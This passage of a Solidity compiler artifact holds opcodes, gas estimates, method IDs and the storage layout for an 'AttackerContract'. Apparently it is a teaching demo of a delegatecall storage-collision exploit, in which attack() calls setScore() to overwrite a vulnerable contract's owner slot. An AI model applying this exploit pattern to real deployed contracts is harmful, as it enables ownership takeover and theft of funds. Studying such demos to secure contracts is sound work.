					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x610 CODESIZE SUB DUP1 PUSH2 0x610 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xEE JUMP JUMPDEST DUP1 PUSH1 0x3 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA9 DUP3 PUSH2 0x7E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xBB DUP3 PUSH2 0x9E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xCB DUP2 PUSH2 0xB0 JUMP JUMPDEST DUP2 EQ PUSH2 0xD6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xE8 DUP2 PUSH2 0xC2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x104 JUMPI PUSH2 0x103 PUSH2 0x79 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x112 DUP5 DUP3 DUP6 ADD PUSH2 0xD9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x4E6 DUP1 PUSH2 0x12A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x62 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x144166AE EQ PUSH2 0x67 JUMPI DUP1 PUSH4 0x422BEEBA EQ PUSH2 0x85 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xA1 JUMPI DUP1 PUSH4 0x92801230 EQ PUSH2 0xBF JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xDD JUMPI DUP1 PUSH4 0xEFEDC669 EQ PUSH2 0xE7 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6F PUSH2 0x105 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x7C SWAP2 SWAP1 PUSH2 0x371 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x9F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x9A SWAP2 SWAP1 PUSH2 0x3C7 JUMP JUMPDEST PUSH2 0x12B JUMP JUMPDEST STOP JUMPDEST PUSH2 0xA9 PUSH2 0x16F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xB6 SWAP2 SWAP1 PUSH2 0x415 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC7 PUSH2 0x195 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xD4 SWAP2 SWAP1 PUSH2 0x415 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xE5 PUSH2 0x1B9 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xEF PUSH2 0x2EC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xFC SWAP2 SWAP1 PUSH2 0x43F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x422BEEBA ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x22A SWAP2 SWAP1 PUSH2 0x43F JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x244 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x258 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x422BEEBA PUSH1 0x1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2B8 SWAP2 SWAP1 PUSH2 0x495 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2D2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2E6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x337 PUSH2 0x332 PUSH2 0x32D DUP5 PUSH2 0x2F2 JUMP JUMPDEST PUSH2 0x312 JUMP JUMPDEST PUSH2 0x2F2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x349 DUP3 PUSH2 0x31C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x35B DUP3 PUSH2 0x33E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x36B DUP2 PUSH2 0x350 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x386 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x362 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3A4 DUP2 PUSH2 0x391 JUMP JUMPDEST DUP2 EQ PUSH2 0x3AF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x3C1 DUP2 PUSH2 0x39B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x3DD JUMPI PUSH2 0x3DC PUSH2 0x38C JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x3EB DUP5 DUP3 DUP6 ADD PUSH2 0x3B2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3FF DUP3 PUSH2 0x2F2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x40F DUP2 PUSH2 0x3F4 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x42A PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x406 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x439 DUP2 PUSH2 0x391 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x454 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x430 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x47F PUSH2 0x47A PUSH2 0x475 DUP5 PUSH2 0x45A JUMP JUMPDEST PUSH2 0x312 JUMP JUMPDEST PUSH2 0x391 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x48F DUP2 PUSH2 0x464 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4AA PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x486 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH21 0x1EA2437C84671A2F3C11D915D41B32E8D91D7E0E64 BASEFEE 0xB4 0xAE PUSH17 0x4EDD1724EC3464736F6C63430008110033 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "250800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"lib()": "2555",
						"owner()": "2536",
						"score()": "2517",
						"setScore(uint256)": "24672",
						"vulnerableContract()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"lib()": "92801230",
					"owner()": "8da5cb5b",
					"score()": "efedc669",
					"setScore(uint256)": "422beeba",
					"vulnerableContract()": "144166ae"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 63,
						"contract": "VulnerableStateVariableContract.sol:AttackerContract",
						"label": "lib",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 65,
						"contract": "VulnerableStateVariableContract.sol:AttackerContract",
						"label": "owner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 67,
						"contract": "VulnerableStateVariableContract.sol:AttackerContract",
						"label": "score",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					},
					{
						"astId": 70,
						"contract": "VulnerableStateVariableContract.sol:AttackerContract",
						"label": "vulnerableContract",
						"offset": 0,
						"slot": "3",
						"type": "t_contract(VulnerableContract)60"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(VulnerableContract)60": {
						"encoding": "inplace",
						"label": "contract VulnerableContract",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}